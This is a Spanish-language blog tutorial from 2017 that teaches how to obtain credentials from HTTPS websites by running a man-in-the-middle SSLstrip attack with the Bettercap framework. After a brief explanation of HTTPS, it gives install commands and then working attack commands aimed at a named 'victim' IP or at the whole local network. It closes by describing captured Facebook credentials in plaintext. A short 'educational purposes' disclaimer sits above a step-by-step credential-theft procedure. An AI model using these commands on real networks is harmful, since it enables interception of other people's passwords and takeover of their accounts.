+++
date = "2017-01-08"
title = "Obtener credenciales HTTPS con Bettercap y SSLstrip"
author = "Javier Olmedo"
toc = false
+++

[![/images/obtener-credenciales-https-con-bettercap-y-sslstrip/obtener-credenciales-https-con-bettercap-y-sslstrip_banner.png](/images/obtener-credenciales-https-con-bettercap-y-sslstrip/obtener-credenciales-https-con-bettercap-y-sslstrip_banner.png)](/images/obtener-credenciales-https-con-bettercap-y-sslstrip/obtener-credenciales-https-con-bettercap-y-sslstrip_banner.png)

Para empezar este 2017, os traigo un tutorial sobre **cómo obtener las credenciales de sitios web que tengan cifrado SSL/TLS (HTTPS)** mediante una técnica llamada **SSLstrip** y el uso de un **framework para realizar ataques MITM** (ataque de hombre en el medio) llamado Bettercap, en Internet, existen multitud de tutoriales para realizar este ataque pero aquí os enseñaré como realizarlo de una manera muy simple.

Este tutorial lo hago con **fines educativos y sobre todo éticos, no me hago responsable del mal uso que podáis dar con lo aprendido aquí**.

## ¿Qué son las páginas https? ¿Qué diferencias hay con las http?

[![/images/obtener-credenciales-https-con-bettercap-y-sslstrip/obtener-credenciales-https-con-bettercap-y-sslstrip_001.png](/images/obtener-credenciales-https-con-bettercap-y-sslstrip/obtener-credenciales-https-con-bettercap-y-sslstrip_001.png)](/images/obtener-credenciales-https-con-bettercap-y-sslstrip/obtener-credenciales-https-con-bettercap-y-sslstrip_001.png)

Muchas veces, nos damos cuenta cuando accedemos a alguna web, que aparece un **candado verde en la parte izquierda de la barra de direcciones**, esto quiere decirnos, que **nuestra conexión con el servidor es segura**, es decir, **el tráfico entre los dos puntos viaja cifrado**.

Este tipo de páginas **podemos encontrarlas** en aquellas que requieran un **nivel «extra» de seguridad** debido a que en ellas se maneja **información sensible** como por ejemplo **contraseñas, números de tarjeta de crédito o información confidencial**.

Un ejemplo del uso de estas páginas pueden ser las **web de los bancos, páginas dedicadas al comercio electrónico (tiendas online) o sitios populares como Google, Facebook o Twitter**.

Podríamos decir que **la diferencia entre https y http es que la información se envía cifrada** para evitar que un tercero capture el tráfico y vea lo que en ella se envía, el trafico https puede ser de igual manera capturado que el tráfico http, pero **no podríamos leer lo que contiene** (en principio).

## Bettercap y SSLstrip

[![/images/obtener-credenciales-https-con-bettercap-y-sslstrip/obtener-credenciales-https-con-bettercap-y-sslstrip_002.png](/images/obtener-credenciales-https-con-bettercap-y-sslstrip/obtener-credenciales-https-con-bettercap-y-sslstrip_002.png)](/images/obtener-credenciales-https-con-bettercap-y-sslstrip/obtener-credenciales-https-con-bettercap-y-sslstrip_002.png)

Bettercap es un **framework que se utiliza para realizar ataques MITM** (Man In The Middle) o hombre en el medio, estos ataques consisten básicamente en **interponerse entre 2 equipos para ver que datos se intercambian**.

A continuación os dejo unos links por si queréis echar un vistazo más a fondo a esta estupenda herramienta.

- [Sitio ofical de Bettercap](https://www.bettercap.org/)
- [GitHub de Bettercap](https://github.com/evilsocket/bettercap)

## Pero, ¿con interponerme en mitad de la conexión es suficiente?

Como bien os había dicho anteriormente, simplemente **interponiéndonos en la conexión entre 2 equipos no es suficiente**, necesitamos hacer uso de **SSLstrip para poder leer lo que en ella se envía**, más adelante lo veremos, os dejo un enlace hacia esta herramienta creada por Moxie Marlinspike.

- [GitHub de SSLstrip](https://github.com/moxie0/sslstrip)

## Instalación de Bettercap.

Para instalar Bettercap, abrimos un terminal **con permisos de superusuario** y escribimos:

1. Instalación de dependencias

```bash
apt-get install build-essential ruby-dev libpcap-dev
```

2. Clonamos el repositorio a nuestro equipo.

```bash
git clone https://github.com/evilsocket/bettercap
```

3. Nos posicionamos en la carpeta del proyecto

```bash
cd bettercap
```

4. Construimos las gemas.

```bash
gem build bettercap.gemspec
```

5. Instalamos las gemas

```bash
gem install bettercap*.gem
```

## Uso de Bettercap y SSLstrip

Bettercap ya trae un módulo para realizar ataques SSLstrip, por eso **creo que esta es la manera más sencilla para realizar este ataque**, si conocéis otra manera más rápida y efectiva de realizar este ataque, **os invito a que podáis publicarlo a continuación de este artículo**.

Abrimos una terminal y escribimos:

```bash
bettercap
```

Deberíamos de ver todos los dispositivos conectados a nuestra red, es hora de acordarnos de **la IP de la víctima, que en mi caso sería la IP 192.168.100.251**.

[![/images/obtener-credenciales-https-con-bettercap-y-sslstrip/obtener-credenciales-https-con-bettercap-y-sslstrip_003.png](/images/obtener-credenciales-https-con-bettercap-y-sslstrip/obtener-credenciales-https-con-bettercap-y-sslstrip_003.png)](/images/obtener-credenciales-https-con-bettercap-y-sslstrip/obtener-credenciales-https-con-bettercap-y-sslstrip_003.png)

Una vez sabemos la IP de la víctima, inicializamos Bettercap de la siguiente manera:

```bash
bettercap -T [IP VÍCTIMA] --proxy -P POST
```

En mi caso quedaría de la siguiente manera: `bettercap -T 192.168.100.251 –proxy -P POST`

Si queremos que el ataque se realice a toda la red, simplemente no especificamos la IP de la víctima, y comenzará a captura todo el tráfico de red.

```bash
bettercap -T --proxy -P POST
```

Una vez la víctima acceda a cualquier página https (en este caso Facebook).

[![/images/obtener-credenciales-https-con-bettercap-y-sslstrip/obtener-credenciales-https-con-bettercap-y-sslstrip_004.png](/images/obtener-credenciales-https-con-bettercap-y-sslstrip/obtener-credenciales-https-con-bettercap-y-sslstrip_004.png)](/images/obtener-credenciales-https-con-bettercap-y-sslstrip/obtener-credenciales-https-con-bettercap-y-sslstrip_004.png)

Podremos ver el tráfico descifrado, y por lo tanto, las credenciales en texto claro.

[![/images/obtener-credenciales-https-con-bettercap-y-sslstrip/obtener-credenciales-https-con-bettercap-y-sslstrip_005.png](/images/obtener-credenciales-https-con-bettercap-y-sslstrip/obtener-credenciales-https-con-bettercap-y-sslstrip_005.png)](/images/obtener-credenciales-https-con-bettercap-y-sslstrip/obtener-credenciales-https-con-bettercap-y-sslstrip_005.png)

Un saludo a todos.

Happy Hacking!!!